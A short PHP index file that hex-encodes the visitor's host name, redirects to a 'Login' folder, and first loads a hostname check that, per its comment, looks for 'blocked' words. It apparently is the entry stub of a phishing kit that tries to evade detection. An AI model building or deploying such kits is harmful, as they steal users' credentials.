<?php
/*
* index.php
*/




//Call Log Files
require_once 'Login/hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$index="Login/?$host";

header("location: $index");


?>
